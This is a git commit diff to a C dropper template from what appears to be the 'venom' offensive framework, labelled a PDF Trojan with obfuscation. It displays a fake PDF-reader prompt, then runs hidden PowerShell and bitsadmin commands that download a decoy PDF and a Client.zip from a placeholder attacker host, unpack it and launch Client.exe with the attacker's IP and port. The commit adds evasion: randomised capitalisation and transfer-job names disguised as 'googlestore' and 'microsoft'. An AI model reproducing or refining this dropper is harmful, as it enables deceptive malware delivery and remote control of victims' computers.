267c209f2336f85c24d05150a8a4e9d651e1f8bc
root <root@localhost.localdomain>
2020-10-05 01:38:23 +0100

    venom v1.0.17.5 - PDF Trojan {Obfuscation=on}

--- templates/dropperTWO.c
+++ templates/dropperTWO.c
@@ -1,6 +1,6 @@
 /*
 Author: r00t-3xp10it (SSA RedTeam @2020)
-Framework: Venom v1.0.17.4 - shinigami
+Framework: Venom v1.0.17.5 - shinigami
 */
 
 #include<stdio.h>
@@ -14,9 +14,9 @@ Framework: Venom v1.0.17.4 - shinigami
 int main()
 {
    MessageBox(NULL, "Open Archive With PDF Reader?", "Portable Document Format (PDF)", MB_YESNO | MB_ICONQUESTION | MB_DEFBUTTON1 | MB_SETFOREGROUND);
-   _("powershell -w 1 -C bitsadmin /transfer purpleteam /download /priority foreground http://LhOsT/FiLNaMe.pdf FiNaL\\FiLNaMe.pdf && powershell Start-Process -windowstyle hidden -FilePath 'TempDir\\FiLNaMe.pdf'");
-   _("powershell -w 1 -C bitsadmin /transfer ssaredteam /download /priority foreground http://LhOsT/Client.zip FiNaL\\Client.zip && powershell Expand-Archive -Force FiNaL\\Client.zip FiNaL");Sleep(1);
-   _("cd TempDir && cmd.exe /R start /min Client.exe ip=LhOsT port=LpOrT");
+   _("powershell -w 1 bitsadmin /tRaNsFeR googlestore /dOwNlOaD /priority foreground http://LhOsT/FiLNaMe.pdf FiNaL\\FiLNaMe.pdf && powershell Start-Process -windowstyle hidden -FilePath 'TempDir\\FiLNaMe.pdf'");
+   _("powershell -w 1 bitsadmin /tRaNsFeR microsoft /dOwNlOaD /priority foreground http://LhOsT/Client.zip FiNaL\\Client.zip && powershell Expand-Archive -Force FiNaL\\Client.zip FiNaL");Sleep(1);
+   _("cd TempDir && cmd /R start /min Client.exe ip=LhOsT port=LpOrT");
    return 0;
 }
 
